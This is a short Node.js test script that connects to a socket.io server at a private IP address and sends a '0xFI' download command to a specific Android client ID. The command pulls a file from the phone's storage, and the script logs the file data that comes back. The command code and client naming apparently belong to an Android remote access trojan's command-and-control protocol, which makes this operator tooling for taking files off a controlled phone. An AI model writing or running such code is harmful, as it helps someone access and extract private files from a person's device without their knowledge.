const io = require('socket.io-client');

const SERVER_URL = 'http://192.168.1.101:9400';

console.log('🔌 Connecting to server...');

const socket = io(SERVER_URL, {
    transports: ['polling', 'websocket']
});

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Send file download command
    console.log('📤 Sending file download command...');
    socket.emit('send_command', {
        clientID: 'android_1758309836329_rl5633k45', // Replace with actual client ID
        command: {
            type: '0xFI',
            action: 'download',
            path: '/storage/emulated/0/Download/test.txt'
        }
    });
    
    console.log('✅ File download command sent successfully');
    
    // Wait for response
    setTimeout(() => {
        console.log('⏰ Test completed');
        process.exit(0);
    }, 10000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('connect_error', (error) => {
    console.log('❌ Connection error:', error.message);
    process.exit(1);
});

// Listen for file responses
socket.on('0xFI', (data) => {
    console.log('📁 File response received:');
    console.log('Type:', data.type);
    if (data.type === 'download') {
        console.log('✅ File downloaded:', data.fileName);
        console.log('📊 Size:', data.fileSizeFormatted);
        console.log('📝 Type:', data.fileType);
        console.log('💾 Buffer Length:', data.buffer ? data.buffer.length : 'No buffer');
    } else if (data.type === 'error') {
        console.log('❌ Error:', data.error);
    }
});
